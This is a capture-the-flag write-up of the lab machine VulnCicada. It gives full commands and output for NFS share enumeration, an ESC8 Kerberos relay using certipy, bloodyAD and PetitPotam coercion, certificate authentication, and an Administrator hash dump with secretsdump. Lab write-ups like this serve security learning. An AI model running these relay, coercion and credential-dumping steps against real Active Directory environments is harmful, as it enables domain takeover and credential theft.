# 𓆦 VulnCicada
```
Machine Information:
VulnCicada is a Medium Windows Active Directory machine that involves discovering a password inside an image on a public share. With that password an attacker is able to discover that the machine is vulnerable to ESC8 and can use Kerberos relaying to bypass self-relay restrictions in order to get a certificate as the machine account itself. With this new certificate, we are able to dump the hashes of the Administrator user and thus compromise the whole domain.
```
# 📝 Summary
VulnCicada is a medium lab which starts easily where you are able to get the credentials for the user Rosia.Powell but then it becomes much more complicated as you need to use ESC8 certificate exploit which would give you administrators rights.

# 🔎 Initial Recon
Lets start with nmap 

```
# Nmap 7.991 scan initiated Mon Nov 23 08:03:34 2026 as: /usr/lib/nmap/nmap --privileged -A -sC -sV -oA Cicada 10.129.234.48
Nmap scan report for 10.129.234.48
Host is up (0.073s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-23 13:03:48Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-11-23T12:53:38
|_Not valid after:  2027-11-23T12:53:38
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-11-23T12:53:38
|_Not valid after:  2027-11-23T12:53:38
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-11-23T12:53:38
|_Not valid after:  2027-11-23T12:53:38
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-11-23T12:53:38
|_Not valid after:  2027-11-23T12:53:38
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-23T13:04:58+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-11-22T13:01:14
|_Not valid after:  2027-05-24T13:01:14
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11 (86%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11
Aggressive OS guesses: Microsoft Windows Server 2022 (86%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-11-23T13:04:39
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   73.44 ms 10.10.14.1
2   73.49 ms 10.129.234.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 23 08:05:43 2026 -- 1 IP address (1 host up) scanned in 129.10 seconds
```
We see a lot of ports open but ones that stood out are 80(http), 111(rpc), 139(rpc nfs share), 389(ldap).
The description suggests that there is a public share somewhere and it would be most logically in the nfs share so lets enumerate if there is something we can mount
```
showmount -e 10.129.94.98

```
We see publicly open profile /profiles that we can mount so lets do that

# Main Exploitation Phase
Lets mount the share
```
mkdir /mnt/nfs-share  -> Make the directory

mount -t nfs 10.129.94.98:/profiles /mnt/nfs-share -o nolock

```
There were a few usernames:
```
Administrator
Daniel.Marshall
Debra.Wright
Jane.Carter
Jordan.Francis
Joyce.Andrews
Katie.Ward
Megan.Simpson
Richard.Gibbons
Rosie.Powell
Shirley.West

```
Some of the share had photos. one of the users Rosie.Powell had a photo where on the photo there was a sticker note on the photo with the password: Cicada123

Now that we have the first credentials our main goal is to discover the next step.

# ESC8 Vulnerability (NTLM relay attack)

First we start with the initial certipy find enumeration that suggests that the exploit is ESC8

This is the ESC8 condition: an attacker who can coerce or relay any authentication into this endpoint can request a certificate on behalf of the relayed identity.

So there were three separate problems we needed to solve: 
1) Start the relay attack
2) use tool like bloodyAD in order to add our VPN as a DNS which matched cicada.vl subdomain.
3) Use crackmapexec/nxc with the petitpotam techniques in order to receive back dc-jpq225.pfx which then would help us to get the administrator hash

Note: Always update clock skew using sudo ntupdate <ip> before running any of the commands so that there would be no issue

```
Start the relay attack
certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController

Add our custom domain using bloodyAD:
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.2

Use nxc with the petitpotam method:
nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam

In the relay it should show if not(check all of the steps update clock, i had to try those commands for 3 hours until it worked):
[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] (SMB): Received connection from 10.129.94.98, attacking target http://dc-jpq225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] (SMB): Authenticating connection from /@10.129.94.98 against http://dc-jpq225.cicada.vl SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] (SMB): Received connection from 10.129.94.98, attacking target http://dc-jpq225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 88
[*] Retrieving certificate for request ID: 88
[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=88 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
[*] Exiting...

```

After that we are going to get our tgt ticket and use secretsdump to get the hash of the admin
```
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.94.98
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3

export KRB5CCNAME=dc-jpq225.ccache
/usr/bin/impacket-secretsdump -k -no-pass -dc-ip 10.129.94.98 'cicada.vl/dc-jpq225$'@DC-JPQ225.cicada.vl -just-dc-user Administrator 
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
[*] Cleaning up... 

```
Now we can log in as admin(and even that you can't just log in with admin and hash because the server isn't checking whether your hash is right — it's refusing the whole method of login before it even looks at the hash. TBH I still fully don't understand why)
```
export KRB5CCNAME=/home/kali/Desktop/HTB/Labs/VulnCicada/Administrator.ccache
evil-winrm -i DC-JPQ225.cicada.vl -r cicada.vl -K /home/kali/Desktop/HTB/Labs/VulnCicada/Administrator.ccache

*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\dc-jpq225\profiles$> type C:\Users\Administrator\Desktop\user.txt
99324d1fe0bc22b4e6361a64dacd1e2f
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\dc-jpq225\profiles$> type C:\Users\Administrator\Desktop\root.txt
9c566e43fc85f2865431737d3f3665c8
```
